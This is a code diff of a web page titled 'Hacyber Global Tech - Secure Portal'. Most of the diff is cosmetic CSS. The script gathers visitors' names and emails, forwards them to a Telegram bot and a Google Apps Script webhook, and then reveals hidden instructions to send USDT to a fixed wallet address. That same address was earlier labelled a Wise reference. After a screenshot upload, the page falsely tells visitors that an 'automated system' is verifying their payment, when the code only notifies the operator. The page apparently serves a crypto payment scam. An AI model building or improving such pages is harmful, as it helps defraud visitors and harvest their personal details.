@@ -6,14 +6,14 @@
     <title>Hacyber Global Tech - Secure Portal</title>
     <style>
         :root {
-            --bg-color: #0b0f19;
-            --card-bg: rgba(17, 24, 39, 0.75);
-            --primary-blue: #0066ff;
-            --accent-blue: #00d2ff;
-            --text-main: #f3f4f6;
-            --text-muted: #9ca3af;
-            --border-color: rgba(0, 210, 255, 0.2);
-            --glow-shadow: 0 0 20px rgba(0, 102, 255, 0.3);
+            --bg-color: #050811;
+            --card-bg: rgba(13, 20, 35, 0.85);
+            --primary-blue: #0055ff;
+            --accent-blue: #00f0ff;
+            --text-main: #ffffff;
+            --text-muted: #a5b4fc;
+            --border-color: rgba(0, 240, 255, 0.4);
+            --glow-shadow: 0 0 35px rgba(0, 119, 255, 0.45), inset 0 0 15px rgba(0, 240, 255, 0.15);
         }
 
         * {
@@ -25,7 +25,9 @@
 
         body {
             background-color: var(--bg-color);
-            background-image: radial-gradient(circle at 50% 10%, rgba(0, 102, 255, 0.15) 0%, transparent 60%);
+            background-image: 
+                radial-gradient(circle at 50% 5%, rgba(0, 119, 255, 0.3) 0%, transparent 55%),
+                radial-gradient(circle at 10% 90%, rgba(0, 240, 255, 0.15) 0%, transparent 40%);
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
@@ -39,12 +41,24 @@
             width: 100%;
             max-width: 480px;
             background: var(--card-bg);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 30px;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1.5px solid var(--border-color);
+            border-radius: 20px;
+            padding: 35px;
             box-shadow: var(--glow-shadow);
-            animation: fadeIn 0.6s ease-out;
+            animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            0% {
+                box-shadow: 0 0 25px rgba(0, 119, 255, 0.4), inset 0 0 10px rgba(0, 240, 255, 0.1);
+                border-color: rgba(0, 240, 255, 0.3);
+            }
+            100% {
+                box-shadow: 0 0 45px rgba(0, 200, 255, 0.7), inset 0 0 20px rgba(0, 240, 255, 0.3);
+                border-color: rgba(0, 240, 255, 0.8);
+            }
         }
 
         .header {
@@ -56,18 +70,19 @@
             max-width: 200px;
             height: auto;
             margin-bottom: 15px;
-            filter: drop-shadow(0 0 8px rgba(0, 210, 255, 0.4));
+            filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.7));
         }
 
         .header h1 {
-            font-size: 1.5rem;
+            font-size: 1.6rem;
             font-weight: 600;
             color: var(--text-main);
             letter-spacing: 0.5px;
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
         }
 
         .header p {
-            font-size: 0.85rem;
+            font-size: 0.9rem;
             color: var(--text-muted);
             margin-top: 5px;
         }
@@ -85,10 +100,10 @@
 
         input {
             width: 100%;
-            padding: 12px 16px;
-            background: rgba(3, 7, 18, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
+            padding: 13px 16px;
+            background: rgba(3, 7, 18, 0.8);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: 10px;
             color: var(--text-main);
             font-size: 0.95rem;
             transition: all 0.3s ease;
@@ -102,33 +117,33 @@
         input:focus {
             outline: none;
             border-color: var(--accent-blue);
-            box-shadow: 0 0 10px rgba(0, 210, 255, 0.25);
+            box-shadow: 0 0 18px rgba(0, 240, 255, 0.5), inset 0 0 5px rgba(0, 240, 255, 0.2);
         }
 
         .btn {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             background: linear-gradient(135deg, var(--primary-blue), var(--accent-blue));
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             color: white;
             font-weight: 600;
             font-size: 1rem;
             cursor: pointer;
-            transition: opacity 0.3s ease, transform 0.2s ease;
-            box-shadow: 0 4px 12px rgba(0, 102, 255, 0.4);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(0, 119, 255, 0.6);
         }
 
         .btn:hover {
-            opacity: 0.9;
-            transform: translateY(-1px);
+            opacity: 0.95;
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px rgba(0, 240, 255, 0.8);
         }
 
         .btn:active {
             transform: translateY(0);
         }
 
-        /* Hidden Payment & Upload Sections */
         #payment-section, #proof-section {
             display: none;
             margin-top: 25px;
@@ -136,14 +151,15 @@
         }
 
         .payment-card {
-            background: rgba(3, 7, 18, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            padding: 15px;
-            border-radius: 8px;
+            background: rgba(3, 7, 18, 0.6);
+            border: 1px solid rgba(0, 240, 255, 0.4);
+            padding: 18px;
+            border-radius: 10px;
             text-align: center;
             margin-bottom: 15px;
             font-size: 0.9rem;
             color: var(--accent-blue);
+            box-shadow: inset 0 0 12px rgba(0, 240, 255, 0.15), 0 0 15px rgba(0, 119, 255, 0.2);
         }
 
         @keyframes fadeIn {
@@ -174,22 +190,22 @@
             <button type="submit" class="btn" id="submit-btn">Verify & Continue</button>
         </form>
 
-        <!-- Hidden Payment Portal Section -->
+        <!-- Hidden USDT Payment Portal Section -->
         <div id="payment-section">
-            <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px;">
+            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
             <div class="payment-card">
-                <strong>Wise Transfer Instructions:</strong><br>
-                Send funds securely to account reference: <br>
-                <span style="color: #fff; font-family: monospace; font-size: 1rem;">TBapFsEXEJWG9GPSXL4xRZpzAgoPZqjwsq</span>
+                <strong>USDT Deposit Instructions:</strong><br>
+                Send funds securely to wallet reference: <br>
+                <span style="color: #fff; font-family: monospace; font-size: 0.9rem; word-break: break-all; text-shadow: 0 0 8px rgba(0,240,255,0.6);">TBapFsEXEJWG9GPSXL4xRZpzAgoPZqjwsq</span>
             </div>
             <button type="button" class="btn" id="proceed-to-proof-btn">I Have Made The Payment</button>
         </div>
 
         <!-- Hidden Proof of Payment Section -->
         <form id="proof-section">
-            <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px;">
+            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
             <div class="form-group">
-                <label for="proof-file">Upload Proof of Payment (Screenshot/Receipt)</label>
+                <label for="proof-file">Upload Proof of Payment (USDT Transaction Screenshot/Receipt)</label>
                 <input type="file" id="proof-file" accept="image/*,.pdf" required>
             </div>
             <button type="submit" class="btn" id="final-submit-btn">Submit Proof for Verification</button>
@@ -203,7 +219,6 @@
 
         let clientData = {};
 
-        // 1. Lead Form Submission -> Send to Telegram & Google Script, then show Payment Section
         document.getElementById('lead-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -214,11 +229,9 @@
             clientData.name = document.getElementById('fullname').value;
             clientData.email = document.getElementById('email').value;
 
-            // Notify via Telegram Bot
             const telegramMessage = `🚨 New Lead Registered:\nName: ${clientData.name}\nEmail: ${clientData.email}`;
             sendTelegramMessage(telegramMessage);
 
-            // Send to Google Apps Script Webhook
             sendToGoogleScript({ type: 'lead', ...clientData });
 
             setTimeout(() => {
@@ -227,13 +240,11 @@
             }, 1000);
         });
 
-        // 2. Proceed from payment instructions to proof upload form
         document.getElementById('proceed-to-proof-btn').addEventListener('click', function() {
             document.getElementById('payment-section').style.display = 'none';
             document.getElementById('proof-section').style.display = 'block';
         });
 
-        // 3. Proof of Payment Form Submission -> Dictate / Notify Real Proof via Telegram
         document.getElementById('proof-section').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -244,13 +255,12 @@
             const fileInput = document.getElementById('proof-file');
             const fileName = fileInput.files[0] ? fileInput.files[0].name : 'Unknown file';
 
-            // Telegram Notification indicating real proof upload attempt
-            const proofMessage = `💳 Payment Proof Uploaded!\nName: ${clientData.name}\nEmail: ${clientData.email}\nFile: ${fileName}\n\n*Action Required: Verify transaction validity against Wise reference TBapFsEXEJWG9GPSXL4xRZpzAgoPZqjwsq*`;
+            const proofMessage = `💳 USDT Payment Proof Uploaded!\nName: ${clientData.name}\nEmail: ${clientData.email}\nFile: ${fileName}\n\n*Action Required: Verify transaction validity against wallet reference TBapFsEXEJWG9GPSXL4xRZpzAgoPZqjwsq*`;
             sendTelegramMessage(proofMessage);
             sendToGoogleScript({ type: 'proof_uploaded', ...clientData, fileName });
 
             setTimeout(() => {
-                alert('Proof submitted successfully! Our automated system is verifying your payment.');
+                alert('Proof submitted successfully! Our automated system is verifying your USDT transaction.');
                 finalBtn.textContent = 'Verified & Submitted';
             }, 1500);
         });
